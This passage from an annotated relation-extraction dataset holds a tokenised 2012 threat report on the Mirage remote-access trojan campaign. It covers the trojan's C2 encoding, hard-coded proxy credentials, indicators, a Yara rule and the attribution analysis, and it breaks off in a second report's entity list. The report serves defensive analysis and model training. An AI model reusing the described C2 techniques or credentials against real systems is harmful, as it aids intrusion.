[{"name": "india-videoer.com", "pos": [18, 19], "sent_id": 124, "type": "Indicator"}], [{"name": "Echosky.biz", "pos": [20, 21], "sent_id": 124, "type": "Indicator"}], [{"name": "Sin Digoo", "pos": [4, 6], "sent_id": 126, "type": "Campaign"}], [{"name": "jeno_1980@hotmail.com", "pos": [9, 10], "sent_id": 126, "type": "Indicator"}], [{"name": "king@hotmail.com", "pos": [11, 12], "sent_id": 126, "type": "Indicator"}], [{"name": "Mirage", "pos": [0, 1], "sent_id": 130, "type": "Malware"}], [{"name": "Yara", "pos": [4, 5], "sent_id": 134, "type": "CourseOfAction"}]], "labels": [{"r": "P21", "h": 18, "t": 16, "evidence": [6, 10]}, {"r": "P21", "h": 19, "t": 17, "evidence": [9, 10]}, {"r": "P21", "h": 21, "t": 20, "evidence": [15, 18]}, {"r": "P21", "h": 22, "t": 20, "evidence": [15, 18]}, {"r": "P21", "h": 23, "t": 20, "evidence": [15, 18]}, {"r": "P21", "h": 24, "t": 20, "evidence": [15, 19]}, {"r": "P21", "h": 25, "t": 20, "evidence": [15, 19]}, {"r": "P21", "h": 26, "t": 20, "evidence": [15, 19]}, {"r": "P14", "h": 27, "t": 28, "evidence": [20]}, {"r": "P13", "h": 27, "t": 33, "evidence": [20, 24]}, {"r": "P21", "h": 35, "t": 34, "evidence": [40]}, {"r": "P13", "h": 38, "t": 39, "evidence": [51]}, {"r": "P34", "h": 59, "t": 58, "evidence": [130, 134]}], "title": "201209DellSecureWorksMirage", "sents": [["The", "Mirage", "Campaign", "Author", ":", "Silas", "Cutler", ",", "Dell", "SecureWorks", "Counter", "Threat", "Unit(TM", ")"], ["Threat", "Intelligence", "Date", ":", "18", "September", "2012", "URL", ":", "http://www.secureworks.com/research/threats/the-mirage-campaign/", "Introduction"], ["Since", "April", "2012", ",", "the", "Dell", "SecureWorks", "Counter", "Threat", "Unit", "\u2122", "(", "CTU", ")", "research", "team", "has", "been", "tracking", "a", "cyber", "espionage", "campaign", "that", "uses", "a", "remote", "access", "trojan", "(", "RAT", ")", "named", "Mirage", "(", "also", "known", "as", "MirageFox", ")", "."], ["This", "ongoing", "attack", "has", "targeted", "a", "high", "-", "profile", "oil", "company", "in", "the", "Phillipines", ",", "a", "military", "organization", "in", "Taiwan", ",", "an", "energy", "company", "in", "Canada", ",", "and", "several", "as", "yet", "unidentified", "entities", "in", "Brazil", ",", "Israel", ",", "Egypt", "and", "Nigeria", "."], ["Analysis", "Distribution", "vector"], ["Based", "on", "the", "data", "collected", "by", "the", "CTU", "research", "team", ",", "the", "campaign", "'s", "primary", "attack", "vector", "is", "spearphishing", "email", "that", "targets", "mid", "-", "level", "to", "senior", "-", "level", "executives", "."], ["These", "emails", "contain", "an", "attachment", "that", "includes", "a", "malicious", "payload", "that", "installs", "a", "copy", "of", "Mirage", "."], ["CTU", "researchers", "have", "identified", "several", "files", "that", "drop", "and", "execute", "a", "copy", "of", "Mirage", "onto", "a", "target", "system", "."], ["These", "\"", "droppers", "\"", "are", "designed", "to", "look", "and", "behave", "like", "PDF", "documents", "."], ["However", ",", "the", "droppers", "are", "stand", "-", "alone", "executable", "files", "that", "open", "an", "embedded", "PDF", "file", "and", "execute", "the", "Mirage", "trojan", "."], ["In", "one", "example", ",", "CTU", "researchers", "observed", "an", "executable", "file", "(", "MD5", "hash", "ce1cdc9c95a6808945f54164b2e4d9d2", ")", "that", "upon", "execution", "drops", "a", "copy", "of", "Mirage", "and", "opens", "an", "embedded", "PDF", "of", "a", "news", "story", "titled", "\"", "Yemeni", "Women", "can", "participate", "in", "politics", "just", "like", "men", ",", "says", "President", "Saleh", "\"", "that", "was", "posted", "on", "the", "Yemen", "Observer", "'s", "website", "."], ["Behavior", "analysis"], ["The", "CTU", "research", "team", "has", "identified", "two", "main", "variants", "of", "the", "Mirage", "trojan", "."], ["These", "variants", "are", "based", "on", "key", "evolutionary", "differences", "in", "the", "execution", "and", "encodings", "used", "in", "communication", "with", "the", "command", "and", "control", "(", "C2", ")", "servers", "."], ["When", "Mirage", "executes", ",", "the", "original", "file", "copies", "itself", "to", "a", "folder", "under", "C:\\Documents", "and", "Settings\\<USER>\\", "or", "C:\\Windows\\", "and", "then", "deletes", "the", "original", "file", "."], ["After", "the", "initial", "copy", ",", "Mirage", "starts", "the", "newly", "created", "file", "and", "exits", "the", "original", "."], ["The", "newly", "started", "copy", "creates", "registry", "keys", "to", "ensure", "that", "the", "system", "remains", "infected", "after", "every", "reboot", "."], ["CTU", "researchers", "have", "observed", "the", "following", "filenames", "created", "after", "execution", ":"], ["svchost.exe", "ernel32.dll", "thumb.db"], ["csrss.exe", "Reader_SL.exe", "MSN.exe", "Phone", "-", "home", "and", "C2", "operations"], ["The", "data", "sent", "by", "Mirage", "shares", "attributes", "with", "the", "malware", "family", "known", "as", "JKDDOS", ",", "which", "was", "researched", "by", "Arbor", "Networks", "."], ["In", "its", "initial", "phone", "-", "home", "connection", ",", "JKDDOS", "sends", "a", "system", "profile", "to", "the", "C2", "server", "."], ["This", "profile", "contains", "the", "CPU", "speed", ",", "memory", "size", ",", "system", "name", "and", "username", "."], ["Similar", "information", "and", "encoding", "techniques", "are", "seen", "in", "the", "initial", "phone", "-", "home", "requests", "of", "Mirage", "infections", "."], ["Mirage", "phones", "home", "to", "its", "C2", "servers", "using", "a", "standard", "HTTP", "request", "."], ["From", "the", "activity", "CTU", "researchers", "have", "observed", "when", "executing", "Mirage", "in", "a", "malware", "sandbox", ",", "this", "communication", "commonly", "occurs", "over", "ports", "80", ",", "443", "and", "8080", ",", "and", "it", "can", "implement", "SSL", "for", "added", "security", "."], ["The", "earliest", "variant", "of", "Mirage", "uses", "an", "HTTP", "POST", "request", "to", "transmit", "the", "initial", "phonehome", "request", "."], ["This", "phone", "-", "home", "request", "contains", "detailed", "system", "information", "of", "the", "infected", "system", "to", "give", "the", "C2", "server", "a", "rough", "profile", "of", "each", "system", "that", "is", "infected", "and", "that", "is", "calling", "home", "."], ["Figure", "1", "."], ["Phone", "-", "home", "request", "(", "variant", "1", ")", "."], ["The", "payload", "is", "encoded", "with", "a", "simple", "cipher", "to", "mask", "the", "data", "being", "sent", "to", "the", "C2", "server", "."], ["The", "cipher", "encodes", "the", "payload", "by", "adding", "each", "character", "'s", "ASCII", "value", "by", "its", "offset", "from", "the", "start", "of", "the", "payload", "."], ["Raw", "values", "M", "i", "r", "a", "g", "e", "Raw", "hex", "0x4d"], ["0x69", "0x72"], ["0x61", "0x67", "0x65"], ["Raw", "decimal", "77", "105", "114", "97", "103", "101"], ["Encoded", "decimal", "77", "106", "116", "100", "107", "106", "Encoded", "hex", "0x4d", "0x6a"], ["0x74", "0x64", "0x6b", "0x6a", "Encoded", "values", "M"], ["j", "t", "d", "k", "j", "Table", "1", "."], ["Payload", "encoding", "."], ["The", "initial", "payload", "starts", "with", "the", "word", "\"", "Mirage", "\"", ",", "which", "in", "its", "encoded", "state", "is", "\"", "Mjtdkj", "\"", "."], ["From", "there", ",", "Mirage", "encodes", "and", "sends", "the", "MAC", "address", ",", "CPU", "information", ",", "system", "name", "and", "username", "in", "the", "initial", "request", "to", "the", "C2", "server", "."], ["If", "the", "C2", "server", "successfully", "receives", "the", "request", ",", "then", "it", "responds", "with", "an", "HTTP", "response", "code", "\"", "200", "OK", "\"", "."], ["The", "word", "\"", "Mirage", "\"", "appears", "in", "its", "payload", ",", "followed", "by", "two", "null", "bytes", "."], ["If", "there", "is", "no", "response", "or", "an", "invalid", "response", "from", "the", "C2", "server", ",", "the", "infected", "system", "continues", "to", "send", "its", "initial", "phone", "-", "home", "request", "at", "regular", "intervals", "."], ["Figure", "2", "."], ["Decoded", "payload", "(", "variant", "1", ")", "."], ["If", "the", "infected", "system", "connects", "successfully", "to", "the", "C2", "server", ",", "then", "the", "infected", "system", "continues", "to", "send", "regular", "check", "-", "in", "updates", "."], ["These", "updates", "are", "transmitted", "the", "same", "way", "as", "the", "initial", "phone", "-", "home", "request", ";", "however", ",", "only", "the", "MAC", "address", "of", "the", "infected", "system", "is", "sent", "in", "the", "payload", "."], ["Figure", "3", "."], ["Decoded", "check", "-", "in", "update", "(", "variant", "1", ")", "."], ["The", "second", "variant", "of", "Mirage", "uses", "HTTP", "GET", "requests", "instead", "of", "HTTP", "POST", "requests", "to", "transmit", "the", "phone", "-", "home", "requests", "'", "payload", "."], ["This", "evolved", "variant", "'s", "initial", "phonehome", "request", "'s", "payload", "is", "contained", "in", "a", "Base64", "-", "encoded", "string", "in", "the", "initial", "request", "."], ["The", "decoded", "Base64", "payload", "contains", "a", "second", "level", "of", "encoding", "that", "has", "several", "variations", "."], ["The", "data", "being", "transmitted", "in", "the", "encoded", "string", "contains", "the", "same", "data", "as", "the", "previous", "variant", ",", "as", "well", "as", "some", "additional", "data", "."], ["One", "change", "is", "the", "text", "at", "the", "beginning", "of", "the", "phone", "-", "home", "payload", "."], ["Instead", "of", "the", "word", "\"", "Mirage", "\"", "used", "in", "earlier", "variants", ",", "later", "variants", "use", "the", "phrase", "\"", "Neo", ",", "welcome", "to", "the", "desert", "of", "the", "real", "\"", ",", "a", "quote", "from", "the", "movie", "The", "Matrix", "."], ["Figure", "4", "."], ["Sample", "request", "(", "variant", "2", ")", "."], ["The", "CTU", "research", "team", "has", "seen", "the", "encoding", "used", "in", "variant", "2", "in", "other", "malware", "families", "."], ["One", "such", "malware", "family", "is", "Lingbo", ",", "which", "uses", "a", "similar", "encoding", "algorithm", "but", "does", "not", "contain", "some", "of", "the", "major", "characteristics", "of", "Mirage", "."], ["Samples", "from", "both", "malware", "families", "have", "included", "strange", "embedded", "quotes", "."], ["Instead", "of", "Mirage", "'s", "quote", "from"], ["The", "Matrix"], [",", "Lingbo", "contains", "the", "embedded", "quote", "\"", "It", "is", "the", "end", "of", "the", "world", "and", "I", "feel", "Fine", "\"", ",", "from", "the", "REM", "song", "\"", "It", "'s", "the", "end", "of", "the", "world", ".", "\""], ["Custom", "versions", "and", "variants"], ["The", "CTU", "research", "team", "identified", "several", "Mirage", "variants", "that", "had", "unique", "attributes", "not", "designed", "for", "widespread", "targeting", "."], ["These", "custom", "variants", "were", "designed", "to", "operate", "under", "specific", "conditions", "and", "to", "evade", "common", "system", "defenses", "."], ["CTU", "researchers", "also", "found", "several", "samples", "that", "contained", "debugging", "information", ",", "possibly", "from", "early", "versions", "."], ["One", "of", "the", "variants", "was", "seen", "in", "a", "subset", "of", "samples", "that", "had", "been", "modified", "specifically", "for", "the", "environment", "targeted", "by", "the", "threat", "actors", "."], ["These", "samples", "had", "been", "configured", "with", "default", "credentials", "for", "the", "targeted", "environment", "'s", "web", "proxy", "servers", "."], ["The", "following", "proxy", "usernames", "and", "password", "combinations", "appear", "in", "the", "samples", "collected", "by", "the", "CTU", "research", "team", ":"], ["a1", ":", "a1", "pagmb", ":", "pa", "quickheal", ":", "quickheal"], ["In", "the", "debugging", "versions", ",", "the", "CTU", "research", "team", "discovered", "two", "strings", "that", "identified", "the", "source", "code", "paths", "from", "which", "the", "samples", "were", "compiled", ":", "D:\\", "....", "\\MF", "-", "v1.2\\Server\\Debug\\Server.pdb", "(", "MD5", "hash", "fa26f410d0133f4152ea78df3978c22", ")"], ["E:\\fox_1.2", "20110307\\MF", "-", "v1.2\\Server\\Release\\MirageFox_Server.pdb", "(", "MD5", "hash", "1045e26819ff782015202838e2c609f7", ")"], ["The", ".pdb", "file", "extension", "is", "commonly", "used", "with", "Microsoft", "Visual", "Studio", "."], ["Its", "use", "in", "these", "debugging", "versions", "coincides", "with", "the", "samples", "for", "Mirage", ",", "which", "were", "written", "using", "Microsoft", "Visual", "C++", "."], ["CTU", "researchers", "also", "noted", "that", "the", "original", "name", "of", "the", "trojan", "used", "in", "the", "path", "is", "MirageFox", ",", "which", "is", "likely", "the", "name", "used", "by", "the", "threat", "actors", "."], ["This", "information", "leads", "to", "two", "potential", "conclusions", ":", "1", "."], ["The", "two", "variants", "of", "MF", "-", "v1.2", ",", "the", "debug", "version", "and", "the", "release", "version", ",", "allow", "the", "threat", "actors", "to", "customize", "variants", "."], ["CTU", "researchers", "have", "already", "seen", "this", "activity", "."], ["2", "."], ["The", "use", "of", "different", "drive", "letters", "but", "similar", "source", "code", "paths", "may", "indicate", "that", "the", "threat", "actors", "are", "keeping", "a", "repository", "of", "tools", "on", "a", "central", "file", "server", "for", "shared", "use", "."], ["Identification", "of", "victims"], ["From", "May", "to", "the", "date", "of", "this", "publication", ",", "the", "CTU", "research", "team", "engaged", "in", "a", "sinkholing", "operation", "."], ["During", "the", "operation", ",", "several", "of", "the", "domains", "formerly", "used", "as", "part", "of", "the", "C2", "infrastructure", "were", "taken", "over", ",", "and", "all", "activity", "to", "the", "domains", "was", "logged", "."], ["The", "sinkholed", "domains", "were", "no", "longer", "in", "use", "and", "were", "freely", "available", "for", "registration", "."], ["During", "the", "operation", ",", "CTU", "researchers", "were", "able", "to", "identify", "approximately", "80", "IP", "addresses", "regularly", "communicating", "to", "the", "sinkhole", "."], ["After", "analyzing", "and", "decoding", "the", "requests", ",", "CTU", "researchers", "discovered", "that", "a", "subset", "of", "the", "observed", "systems", "had", "usernames", "such", "as", "\"", "admin", "\"", "or", "\"", "owner", "\"", ",", "and", "the", "originating", "IP", "address", "resolved", "to", "either", "a", "residence", "or", "an", "antivirus", "or", "security", "company", "."], ["Because", "these", "requests", "were", "most", "likely", "from", "behavioral", "testing", "on", "the", "malware", "sample", ",", "the", "CTU", "research", "team", "filtered", "these", "connections", "out", "of", "the", "results", "."], ["After", "decoding", "the", "inbound", "requests", ",", "the", "CTU", "research", "team", "identified", "approximately", "100", "-", "120", "infected", "systems", "attempting", "to", "phone", "home", "."], ["The", "majority", "of", "the", "inbound", "requests", "came", "from", "Taiwan", "or", "the", "Philippines", ",", "with", "several", "isolated", "cases", "in", "Nigeria", ",", "Brazil", ",", "Israel", ",", "Canada", "and", "Egypt", "."], ["Many", "of", "the", "IP", "addresses", "originate", "from", "networks", "owned", "by", "the", "oil", "company", ",", "energy", "company", ",", "and", "military", "organization", "."], ["Deeper", "analysis", "of", "the", "phone", "-", "home", "requests", "and", "correlation", "with", "social", "networking", "sites", "allowed", "CTU", "researchers", "to", "identify", "a", "specific", "individual", "infected", "with", "Mirage", "."], ["It", "was", "an", "executive", "-", "level", "finance", "manager", "of", "the", "Phillipine", "-", "based", "oil", "company", "."], ["Figure", "5", "."], ["Sources", "of", "infected", "hosts", "."], ["Threat", "actors"], ["The", "threat", "actors", "using", "Mirage", "have", "employed", "several", "tactics", "to", "attempt", "to", "hide", "their", "identities", "and", "their", "primary", "C2", "servers", "."], ["One", "of", "the", "common", "tactics", "is", "using", "dynamic", "domain", "name", "system", "(", "dDNS", ")", "domains", "for", "the", "callbacks", "to", "the", "C2", "servers", "."], ["dDNS", "providers"], ["(", "e.g.", ",", "Dyndns.com", ")", "allow", "anyone", "to", "register", "for", "a", "free", "third", "-", "level", "domain", "(", "e.g.", ",", "Checkip.dyndns.org", ")", "and", "require", "only", "a", "valid", "email", "address", ",", "which", "is", "kept", "private", "."], ["When", "investigating", "the", "DNS", "addresses", "of", "the", "C2", "servers", ",", "CTU", "researchers", "identified", "several", "IP", "addresses", "of", "hosting", "companies", "based", "in", "the", "United", "States", "that", "are", "running", "HTran", "."], ["HTran", "software", "is", "used", "to", "proxy", "connections", "from", "one", "system", "to", "another", "."], ["In", "the", "past", ",", "it", "has", "been", "used", "to", "disguise", "the", "true", "C2", "servers", "used", "by", "malware", "authors", "."], ["In", "the", "CTU", "research", "team", "'s", "2011", "analysis", "of", "HTran", ",", "the", "software", "'s", "author", "was", "identified", "as", "a", "member", "of", "the", "Chinese", "hacker", "group", "HUC", ",", "the", "Honker", "Union", "of", "China", "."], ["Despite", "efforts", "to", "operate", "anonymously", ",", "there", "were", "several", "clues", "that", "pointed", "to", "the", "true", "identities", "of", "the", "attackers", "."], ["During", "an", "analysis", "of", "the", "phone", "-", "home", "activity", ",", "CTU", "researchers", "identified", "four", "unique", "second", "-", "level", "domains", "that", "were", "not", "connected", "to", "a", "dDNS", "provider", "."], ["Two", "of", "these", "domains", "shared", "a", "common", "owner", "'s", "email", "address", ",", "and", "two", "were", "previously", "flagged", "for", "suspicious", "activity", "."], ["C2", "domain", "name", "Owner", "name", "Owner", "email", "Adobesuit.com", "nie", "min", "dnsjacks@yahoo.com", "antivirusbar.org", "white", "jacks", "dnsjacks@yahoo.com"], ["Echosky.biz", "tawnya", "grilth", "jeno_1980@hotmail.com", "India-videoer.com", "india", "videoer", "king@hotmail.com"], ["Asia-online.us", "bkpathak", "king_public@hotmail.com", "/", "kings@hotmail.com", "Table", "2", "."], ["Unique", "second", "-", "level", "domains", "."], ["CTU", "researchers", "correlated", "86", "%", "of", "the", "IP", "addresses", "the", "dDNS", "domains", "used", "in", "the", "phone", "-", "home", "request", "to", "IP", "addresses", "of", "subdomains", "belonging", "to", "domains", "owned", "by"], ["dnsjacks@yahoo.com", "."], ["Of", "the", "remaining", "14", "%", "that", "were", "not", "directly", "associated", ",", "CTU", "re-", "searchers", "correlated", "10", "%", "to", "IP", "ranges", "that", "resolved", "to", "subdomains", "owned", "by"], ["dnsjacks@yahoo.com", "."], ["Figure", "6", "."], ["Analysis", "of", "IP", "addresses", "."], ["(", "Source", ":", "Dell", "SecureWorks", ")"], ["This", "link", "between", "the", "IP", "addresses", "and", "the", "subdomains", "indicates", "that", "dnsjacks@yahoo.com", "owns", "the", "dDNS", "domains", "."], ["Using", "historical", "DNS", "records", ",", "CTU", "researchers", "were", "able", "to", "map", "each", "of", "the", "dDNS", "domains", "to", "a", "subdomain", "of", "a", "domain", "owned", "by", "dnsjacks@yahoo.com", "."], ["Figure", "7", "."], ["Details", "of", "IP", "range", "."], ["In", "the", "samples", "CTU", "researchers", "analyzed", ",", "the", "other", "domains", "associated", "with", "the", "phonehome", "activity", "are", "asia-online.us", ",", "india-videoer.com", "and", "Echosky.biz", "."], ["The", "CTU", "research", "team", "previously", "flagged", "these", "domains", "in", "the", "HTran", "investigation", "and", "later", "in", "the", "Sin", "Digoo", "analysis", "."], ["The", "analysis", "of", "the", "Sin", "Digoo", "affair", "indicated", "that", "jeno_1980@hotmail.com", "and", "king@hotmail.com", "were", "connected", "."], ["From", "the", "data", "the", "CTU", "research", "team", "has", "collected", ",", "indications", "point", "to", "dnsjacks@yahoo.com", "being", "either", "another", "alias", "or", "an", "associate", "of", "the", "actor", "referenced", "in", "the", "HTran", "and", "Sin", "Digoo", "analyses", "."], ["Figure", "8", "."], ["A", "common", "phone", "number", "was", "found", "to", "link", "india-videoer.com", "and", "asia-online.us", "Conclusion"], ["Mirage", "represents", "only", "one", "small", "piece", "of", "malware", "involved", "in", "an", "ongoing", "worldwide", "campaign", "."], ["Over", "the", "past", "few", "years", ",", "these", "campaigns", "have", "become", "extremely", "successful", ",", "and", "a", "great", "deal", "of", "intellectual", "property", "and", "company", "secrets", "has", "been", "stolen", "from", "the", "targeted", "companies", "."], ["For", "companies", "in", "the", "targeted", "industries", ",", "it", "is", "important", "to", "have", "a", "strong", "perimeter", "security", "line", "in", "place", "."], ["Using", "active", "intrusion", "detection", "and", "prevention", "systems", "as", "well", "as", "DNS", "monitoring", "for", "malicious", "domains", "is", "essential", "to", "detecting", "this", "activity", "."], ["Companies", "that", "use", "the", "Yara", "malware", "identification", "and", "classification", "tool", "for", "scanning", "local", "systems", "can", "use", "the", "rules", "provided", "in", "the", "appendix", "to", "search", "for", "potential", "infections", "."], ["Traditionally", ",", "the", "success", "of", "botnets", "created", "by", "threat", "actor", "groups", "has", "been", "measured", "by", "the", "quantity", "of", "infected", "systems", "and", "the", "difficulty", "to", "defend", "against", "in", "the", "long", "term", "."], ["These", "targeted", "attacks", "show", "that", "a", "successful", "campaign", "requires", "only", "a", "small", "quantity", "of", "infected", "systems", "to", "accomplish", "the", "attackers", "'", "objectives", "and", "to", "yield", "extremely", "power-", "ful", "results", "."], ["Appendix"], ["Yara", "rules", "rule", "Mirage_APT_Backdoor", ":", "APT", "Mirage", "Backdoor", "Rat", "MirageRat", "{", "meta", ":", "author", "=", "\"", "Silas", "Cutler", "(", "SCutler@SecureWorks.\u2010", "com", ")", "\"", "version", "=", "\"", "1.0", "\"", "description", "=", "\""], ["Malware", "related", "to", "APT", "cam\u2010", "paign", "\"", "type", "=", "\"", "APT", "Trojan", "/", "RAT", "/", "Backdoor", "\"", "strings", ":", "$", "a1", "=", "\"", "welcome", "to", "the", "desert", "of", "the", "real", "\"", "$", "a2", "=", "\"", "Mirage", "\"", "$", "b", "=", "\"", "Encoding", ":", "gzip", "\"", "$", "c", "=", "/\\/[A", "-", "Za", "-", "z]*\\?hl", "=", "en/", "condition", ":", "(", "(", "$", "a1", "or", "$", "a2", ")", "or", "$", "b", ")", "and", "$", "c"], ["}"], ["MD5", "hashes", "5efd0d7f52890291599c8562e8ea92db", "eacd03ee55ea7d22b45762c82ae1c0e5", "ce1cdc9c95a6808945f54164b2e4d9d2"], ["5326e4fe9fd10e37d46e81c0f6bbf29a", "b2e821828df59c734c1cc379ef7f3122", "875877eedcd9f2d60bf63937fe22073d", "02d77cdaa808ded64d09eea732a586cc"], ["18a5c6e92b962bc6512486db94bb17a7", "32b33321290ac8011aa218da554b8fa5", "f41896e9f77855842380fd9ed795bc64"], ["407c291cd5c73da680fa9af9ec017fff", "7adb0f22468c10901bd280b2d8a154b0", "abac650ab39c0dd074310710081d715d"], ["c9e49c504d5ca953c858d29b7a2acb9d", "aaa9aae486ee7342d29a0a2f9b0ca205", "7ad79f9a0efde6f4673585e400f29f18", "f51fbafc652e10a9ce13795d4cb2d449", "a748ff9663b2d39a35e4c073b73cd7f6", "e7d5ac11903c0217a999a79bc87182d2", "1b918c8a40dc4a66430cfec7dabeb7f3", "c72d7794dc7f2eda6b44b934fe8fff1c"], ["ad2dda9241cd6c0e879ab665d77ce13c", "ccf34d2ba81de856af8167e73d0c8b69", "ebe7699033424b9ef444364bd23ba665", "7349c7908a672de885fdf9f9cc4547b5", "eacd14ce8414911546cb027a8cb2fecd", "4b9723a4060838114e53d1df3fa2537a", "070ef82a0bded089b6f996a392ca7b9a", "286f7b377f5d0ca3505ed1ba6601c947"], ["4d74a83e2f623f17e17eb95736dc587b"], ["a4b9bfc5aa5e37cc613112b9a9dcdb3e", "fb17ffc7495880a7c19df0ebe5c97ad7", "e29ab99be392bb7012f516a2dbfdc00c", "8caf2a96e4d7bb83156c260ccc8f47e7", "a4ff66224a0967763e1d079c99482577", "f0b93bf7273cbeaed69ed55b5169daf7", "3be6fea2bf35c3c3be860622c68ff369"], ["5fa26f410d0133f4152ea78df3978c22", "3d10e68dec16b1a4bf949e3e403f2dda", "5c371a6dfb45f188fe8e6da4fee9300d", "9ff3a9ef192453ecec26cf567c579bff", "65445b138d80954cc912a6e43fe5b66d", "685805936d8744225f8c11965202de8e"], ["80e978d0eea713812f1dd6b4e9b7daf2", "921c724ccb04b9f672b294ffff83ce7b", "072877b961e31e8792a296c63b9c7b56"], ["1a8bc862ceaa7e05189345065145842a"], ["6794cc6f5e463ee7432b9e718d8c1b8e", "fdb949112cc72c68fc7c1ea0c65344bc"], ["f4a6114fce22eb18b0ccf19cfa68ddba", "1045e26819ff782015202838e2c609f7", "5640beb540bef2e97ec4366713d533b8"], ["0f93d28964b440c241ca126a7f94dae2"], ["075df4723073ff08cd3e90d2b1f11722"], ["240627a306f32483378e44ff13e12169", "5f2a4d865e6e94f7f15571faab5128d6", "3bfa7b806ff540cc1c264ec75048fbc4", "05a02e08cce99d3821574d8612f757fd"], ["d60cfe03bce8647cce723991e2cd2f8c"], ["6ed270da7450945a3a5a05eda8312732", "a1083968b78c081135268b6e4e12b1e5", "0fce05e2cea6bd9c217373f2ab962d82", "85ef19fab3951d4dd56e42b5a9ccdeea"], ["422f1ffe7e5bda7062f005be92fba36e", "346aa61b5739e616482a1bc8bb548871", "c2661e45ec2198b04b29ec3fd1e120b2", "e04e5eb4aefeb326246d7f41d1b50759", "eb1aa241b4a482ac44b27ce38eabccb7", "418fb9ba2a61bccab3e54ebe0698c4b6"], ["590e68aaaa5c2353b7288f64cc87d9bb"], ["1f9894e730c0f5ba085baae409aa963a"], ["11b76423f450ba610f073e7522eeb56b"], ["54d37fb1f624c798f0b400b4f50f3635"], ["7fda0451e4d320cc34efcaaabedd6824", "84fc624f9f5f8de6980497058db1e8e1", "964eec615f977b05bc87943ce0942cf9"], ["5069057b799636c012eec38147fb96e6"], ["a4a1670c537861f7d5b0db115a7aa5fa", "00b9619613bc82f5fe117c2ca394a328", "2219bef789ff73efc0a01f87be03188d"]]}, {"vertexSet": [[{"name": "VOHO", "pos": [1, 2], "sent_id": 0, "type": "Campaign"}], [{"name": "July of 2012", "pos": [1, 4], "sent_id": 1, "type": "Time"}], [{"name": "RSA FirstWatchSM", "pos": [6, 8], "sent_id": 1, "type": "Organization"}], [{"name": "Will Gragido", "pos": [5, 7], "sent_id": 4, "type": "Person"}], [{"name": "VOHO", "pos": [19, 20], "sent_id": 14, "type": "Campaign"}], [{"name": "Advanced Persistent Threat", "pos": [22, 25], "sent_id": 15, "type": "MalwareCharacteristics"}], [{"name": "Hong Kong", "pos": [56, 58], "sent_id": 15, "type": "Location"}], [{"name": "Gh0st RAT", "pos": [77, 79], "sent_id": 15, "type": "Malware"}], [{"name": "Washington, DC", "pos": [18, 21], "sent_id": 16, "type": "Location"}], [{"name": "Boston, Massachusetts", "pos": [22, 25], "sent_id": 16, "type": "Location"}], [{"name": "Aurora", "pos": [19, 20], "sent_id": 17, "type": "Campaign"}], [{"name": "Ghostnet", "pos": [22, 23], "sent_id": 17, "type": "Campaign"}], [{"name": "Water Holing", "pos": [9, 11], "sent_id": 20, "type": "MalwareCharacteristics"}], [{"name": "gh0strat", "pos": [32, 33], "sent_id": 23, "type": "Payload"}], [{"name": "hxxp://www.xxxxxxxxtrust.com", "pos": [1, 2], "sent_id": 26, "type": "ExploitTargetObject"}], [{"name": "hxxp://xxxxxxcountymd.gov", "pos": [3, 4], "sent_id": 26, "type": "ExploitTargetObject"}], [{"name": "hxxp://ifxx.org", "pos": [20, 21], "sent_id": 27, "type": "ExploitTargetObject"}], [{"name": "hxxp://xxxxxxcenter.org", "pos": [22, 23], "sent_id": 27, "type": "ExploitTargetObject"}], [{"name": "hxxp://xxi.org", "pos": [24, 25], "sent_id": 27, "type": "ExploitTargetObject"}], [{"name": "hxxp://xxxxxxx.prio.no", "pos": [26, 27], "sent_id": 27, "type": "ExploitTargetObject"}], [{"name": "hxxp:/xxxxxxxxpolitics.com", "pos": [28, 29], "sent_id": 27, "type": "ExploitTargetObject"}], [{"name": "hxxp://www.rfxxx.org", "pos": [30, 31], "sent_id": 27, "type": "ExploitTargetObject"}], [{"name": "Defense Industrial Base and Educational community", "pos": [5, 11], "sent_id": 28, "type": "Organization"}], [{"name": "hxxp://www.gftxxx.org", "pos": [21, 22], "sent_id": 28, "type": "ExploitTargetObject"}], [{"name": "hxxp://www.xxxxxxantennas.com", "pos": [23, 24], "sent_id": 28, "type": "ExploitTargetObject"}], [{"name": "Defense Industrial Base", "pos": [31, 34], "sent_id": 29, "type": "ExploitTargetObject"}], [{"name": "hxxp://xxxxxxxcurling.com", "pos": [0, 1], "sent_id": 30, "type": "Exploit"}], [{"name": "CVE-2012-1889", "pos": [22, 25], "sent_id": 31, "type": "Vulnerability"}], [{"name": "CVE-2012-1723", "pos": [29, 32], "sent_id": 31, "type": "Vulnerability"}], [{"name": "Gh0st RAT", "pos": [39, 41], "sent_id": 31, "type": "Malware"}], [{"name": "58.64.155.59", "pos": [52, 53], "sent_id": 31, "type": "Address"}], [{"name": "58.64.155.57", "pos": [54, 55], "sent_id": 31, "type": "Address"}], [{"name": "CVE-2008-3869", "pos": [22, 25], "sent_id": 32, "type": "Vulnerability"}], [{"name": "CVE-2008-3870", "pos": [26, 29], "sent_id": 32, "type": "Vulnerability"}], [{"name": "iframe.js", "pos": [3, 4], "sent_id": 38, "type": "Exploit"}], [{"name": "Gh0st RAT", "pos": [19, 21], "sent_id": 38, "type": "Malware"}], [{"name": "gh0st", "pos": [13, 14], "sent_id": 39, "type": "Malware"}], [{"name": "CVE-2012-1889", "pos": [50, 53], "sent_id": 39, "type": "Vulnerability"}], [{"name": "CVE-2012-1723", "pos": [57, 60], "sent_id": 39, "type": "Vulnerability"}], [{"name": "June 25th, 2012", "pos": [8, 12], "sent_id": 40, "type": "Time"}], [{"name": "July 18th 2012", "pos": [13, 16], "sent_id": 40, "type": "Time"}], [{"name": "CVE-2012-1889", "pos": [23, 26], "sent_id": 40, "type": "Vulnerability"}], [{"name": "CVE-2012-1889", "pos": [8, 11], "sent_id": 41, "type": "Vulnerability"}], [{"name": "http://www.xxxxxxxcurling.com/Results/cx/magma/iframe.js", "pos": [8, 9], "sent_id": 43, "type": "Indicator"}], [{"name": "http://www.xxxxxxxcurling.com/Results/cx/magma/module.php", "pos": [0, 1], "sent_id": 44, "type": "Indicator"}], [{"name": "http://www.xxxxxxxcurling.com/Results/cx/magma/engine.js", "pos": [0, 1], "sent_id": 45, "type": "Indicator"}], [{"name": "http://www.xxxxxxxcurling.com/Results/cx/magma/if.htm", "pos": [0, 1], "sent_id": 46, "type": "Indicator"}], [{"name": "http://www.xxxxxxxcurling.com/Results/cx/magma/enblue.htm", "pos": [0, 1], "sent_id": 48, "type": "Indicator"}], [{"name": "http://www.xxxxxxxcurling.com/Results/cx/magma/book.cab", "pos": [1, 2], "sent_id": 49, "type": "Indicator"}], [{"name": "Iframe.js", "pos": [0, 1], "sent_id": 53, "type": "Exploit"}], [{"name": "Module.php", "pos": [1, 2], "sent_id": 57, "type": "Exploit"}], [{"name": "Engine.js", "pos": [14, 15], 